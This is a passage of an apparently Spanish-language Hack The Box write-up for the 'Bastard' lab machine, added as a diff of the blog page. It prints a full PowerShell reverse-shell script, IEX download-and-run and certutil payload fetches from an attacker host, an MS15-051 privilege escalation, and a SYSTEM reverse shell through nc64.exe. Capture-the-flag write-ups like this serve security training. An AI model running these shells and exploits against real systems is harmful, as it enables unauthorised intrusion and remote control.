+        [Parameter(ParameterSetName="reverse")]
+        [Switch]
+        $Reverse,
+
+        [Parameter(ParameterSetName="bind")]
+        [Switch]
+        $Bind
+
+    )
+
+    
+    try 
+    {
+        #Connect back if the reverse switch is used.
+        if ($Reverse)
+        {
+            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+        }
+
+        #Bind to the provided port if Bind switch is used.
+        if ($Bind)
+        {
+            $listener = [System.Net.Sockets.TcpListener]$Port
+            $listener.start()    
+            $client = $listener.AcceptTcpClient()
+        } 
+
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535|%{0}
+
+        #Send back current username and computername
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        #Show an interactive PowerShell prompt
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&gt;')
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+        {
+            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+            $data = $EncodedText.GetString($bytes,0, $i)
+            try
+            {
+                #Execute the command on the target.
+                $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String )
+            }
+            catch
+            {
+                Write-Warning "Something went wrong with execution of command on the target." 
+                Write-Error $_
+            }
+            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&gt; '
+            $x = ($error[0] | Out-String)
+            $error.clear()
+            $sendback2 = $sendback2 + $x
+
+            #Return the results
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte,0,$sendbyte.Length)
+            $stream.Flush()  
+        }
+        $client.Close()
+        if ($listener)
+        {
+            $listener.Stop()
+        }
+    }
+    catch
+    {
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
+        Write-Error $_
+    }
+}
+
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 443
+</code></pre>
+
+<p>Nos compartimos ahora un servicio web con <code>python</code> y nos ponemos en escucha por el puerto <code>443</code>.</p>
+
+<pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+
+<p>Ejecutamos el script mediante el archivo <code>pwn.php</code> que subimos previamente y elecutamos <code>Invoke-PowerShellTcp.ps1</code> con <code>IEX</code> para que se nos interprete.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Bastard/drupal15.PNG" alt="" /></p>
+
+<p>Recibimos la petición</p>
+
+<pre><code class="language-python">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.9 - - [29/Apr/2023 03:34:16] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
+</code></pre>
+
+<p>y ganamos acceso en una <code>powershell</code>.</p>
+
+<pre><code class="language-bash">❯ rlwrap ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.9.
+Ncat: Connection from 10.10.10.9:49349.
+Windows PowerShell running as user BASTARD$ on BASTARD
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\inetpub\drupal-7.54&gt;
+</code></pre>
+
+<p>Nos dirigimos al directorio del usuario <code>dimitris</code> y visiualizamos la primera flag <code>user.txt</code>.</p>
+
+<pre><code class="language-cmd">cd Desktop
+dir
+
+
+    Directory: C:\Users\dimitris\Desktop
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---         19/3/2017   8:06 ??         32 user.txt                          
+
+
+type user.txt
+ba22fde1932d06eb76a163d312f921a2
+PS C:\Users\dimitris\Desktop&gt;
+</code></pre>
+
+<p>Logramos obtener unas contraseñas en texto claro.</p>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Usaremos <code>sherlock.ps1</code> para detectar vias potenciales de escalar privilegios en el <code>kernel</code>. esta herramienta realiza un proceso similar a herramientas como <code>powerview</code> y <code>winpeas</code>.</p>
+
+<ul>
+  <li><a href="https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1">https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1</a></li>
+</ul>
+
+<p>Una vez tengamos el <code>script</code> si filtramos por <code>function</code>. podemos ver distintas opciones que podemos probar.</p>
+
+<pre><code class="language-bash">❯ cat Sherlock.ps1 | grep "function"
+function Get-FileVersionInfo ($FilePath) {
+function Get-InstalledSoftware($SoftwareName) {
+function Get-Architecture {
+function Get-CPUCoreCount {
+function New-ExploitTable {
+function Set-ExploitTable ($MSBulletin, $VulnStatus) {
+function Get-Results {
+function Find-AllVulns {
+function Find-MS10015 {
+function Find-MS10092 {
+function Find-MS13053 {
+function Find-MS13081 {
+function Find-MS14058 {
+function Find-MS15051 {
+function Find-MS15078 {
+function Find-MS16016 {
+function Find-MS16032 {
+function Find-MS16034 {
+function Find-CVE20177199 {
+function Find-MS16135 {
+</code></pre>
+
+<p>Usaremos la opción <code>Find-AllVulns</code> que me probara todas las opciones. Para ello debemos abrirnos el <code>script</code> y en la linea final agregar <code>Find-AllVulns</code>, que hara que al interpretarse el codigo al final llame a esa función.</p>
+
+<pre><code class="language-powershell">        $Build = [int]$VersionInfo[2]
+        $Revision = [int]$VersionInfo[3].Split(" ")[0]
+
+        switch ( $Build ) {
+
+            7601 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -lt 23584 ] }
+            9600 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 18524 ] }
+            10240 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 16384 ] }
+            10586 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 19 ] }
+            14393 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 446 ] }
+            default { $VulnStatus = "Not Vulnerable" }
+
+        }
+
+    Set-ExploitTable $MSBulletin $VulnStatus
+
+}
+
+Find-AllVulns
+</code></pre>
+
+<p>Compartimos un servicio web con <code>python</code> nuevamente y interpretamos el script desde la maquina victima con <code>IEX</code>.</p>
+
+<pre><code class="language-cmd">Iex(New-Object Net.WebClient).downloadString('http://10.10.16.3/Sherlock.ps1')
+
+Title      : User Mode to Ring (KiTrap0D)
+MSBulletin : MS10-015
+CVEID      : 2010-0232
+Link       : https://www.exploit-db.com/exploits/11199/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : Task Scheduler .XML
+MSBulletin : MS10-092
+CVEID      : 2010-3338, 2010-3888
+Link       : https://www.exploit-db.com/exploits/19930/
+VulnStatus : Appears Vulnerable
+
+Title      : NTUserMessageCall Win32k Kernel Pool Overflow
+MSBulletin : MS13-053
+CVEID      : 2013-1300
+Link       : https://www.exploit-db.com/exploits/33213/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : TrackPopupMenuEx Win32k NULL Page
+MSBulletin : MS13-081
+CVEID      : 2013-3881
+Link       : https://www.exploit-db.com/exploits/31576/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : TrackPopupMenu Win32k Null Pointer Dereference
+MSBulletin : MS14-058
+CVEID      : 2014-4113
+Link       : https://www.exploit-db.com/exploits/35101/
+VulnStatus : Not Vulnerable
+
+Title      : ClientCopyImage Win32k
+MSBulletin : MS15-051
+CVEID      : 2015-1701, 2015-2433
+Link       : https://www.exploit-db.com/exploits/37367/
+VulnStatus : Appears Vulnerable
+
+Title      : Font Driver Buffer Overflow
+MSBulletin : MS15-078
+CVEID      : 2015-2426, 2015-2433
+Link       : https://www.exploit-db.com/exploits/38222/
+VulnStatus : Not Vulnerable
+
+Title      : 'mrxdav.sys' WebDAV
+MSBulletin : MS16-016
+CVEID      : 2016-0051
+Link       : https://www.exploit-db.com/exploits/40085/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : Secondary Logon Handle
+MSBulletin : MS16-032
+CVEID      : 2016-0099
+Link       : https://www.exploit-db.com/exploits/39719/
+VulnStatus : Appears Vulnerable
+</code></pre>
+
+<p>Vemos que parece ser vulnerable a <code>MS15-051</code> y para explotarlo usaremos un repositorio en github, del cual podemos descargarnos un archivo <code>zip</code> que contiene el ejecutable.</p>
+
+<ul>
+  <li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051</a></li>
+</ul>
+
+<pre><code class="language-bash">❯ ls
+ Source   ms15-051.exe   ms15-051x64.exe
+</code></pre>
+<p>Procedemos a subirlo a la maquina victima, para ello usaremos <code>certutil</code>.</p>
+
+<pre><code class="language-cmd">certutil.exe -f -urlcache -split http://10.10.16.3/ms15-051x64.exe ms15-051x64.exe
+****  Online  ****
+  0000  ...
+  d800
+CertUtil: -URLCache command completed successfully.
+
+dir
+
+    Directory: C:\WIndows\Temp\Priv
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---         29/4/2023   7:04 ??      55296 ms15-051x64.exe
+</code></pre>
+
+<p>Para ejecutarlo, simplemte debemos pasarle un comando.</p>
+
+<pre><code class="language-cmd">.\ms15-051x64.exe "whoami"
+[#] ms15-051 fixed by zcgonvh
+[!] process with pid: 1760 created.
+==============================
+nt authority\system
+PS C:\WIndows\Temp\Priv&gt; 
+</code></pre>
+
+<p>Seguidamente para ganar acceso como <code>administrator</code>, descargaremos <code>ncat</code> versión <code>1.12</code></p>
+
+<ul>
+  <li><a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></li>
+</ul>
+
+<p>Una vez lo tengamos, proceremos a subir <code>nc64.exe</code> a la maquina victima.</p>
+
+<pre><code class="language-bash">❯ ls
+ doexec.c   generic.h   getopt.c   getopt.h   hobbit.txt   license.txt   Makefile   nc.exe   nc64.exe   netcat.c   readme.txt
+</code></pre>
+
+<pre><code class="language-cmd">certutil.exe -f -urlcache -split http://10.10.16.3/nc64.exe nc64.exe
+****  Online  ****
+  0000  ...
+  b0d8
+CertUtil: -URLCache command completed successfully.
+</code></pre>
+
+<p>Una vez subido el ejecutable, vamos a ejecutarlo de manera privilegiada usando el <code>exploit</code> y asi obtener una consola interactiva.</p>
+
+<pre><code class="language-cmd">    Directory: C:\Windows\Temp\Priv
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---         29/4/2023   7:04 ??      55296 ms15-051x64.exe                   
+-a---         29/4/2023   7:15 ??      45272 nc64.exe                          
+
+
+.\ms15-051x64.exe "C:\Windows\Temp\Priv\nc64.exe -e cmd 10.10.16.3 443"
+</code></pre>
+
+<p>Ejecutamos y recibimos la conexión como <code>nt authority\system</code>.</p>
+
+<pre><code class="language-bash">❯ rlwrap ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.9.
+Ncat: Connection from 10.10.10.9:49361.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+whoami
+whoami
+nt authority\system
+
+C:\Windows\Temp\Priv&gt;
+</code></pre>
+
+<p>Finalmente nos dirigimos al directorio personal del usuario <code>administrator</code> y visualizamos la segunda flag <code>root.txt</code> 😏.</p>
+
+<pre><code class="language-cmd">dir
+ Volume in drive C has no label.
+ Volume Serial Number is C4CD-C60B
+
+ Directory of C:\Users\Administrator\Desktop
+
+08/02/2022  05:50     &lt;DIR&gt;          .
+08/02/2022  05:50     &lt;DIR&gt;          ..
+19/03/2017  08:34                 32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)   4.134.981.632 bytes free
+
+type root.txt
+type root.txt
+4bf12b963da1b30cc93496f617f7ba7c
+</code></pre>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Bastard - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Bastard" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
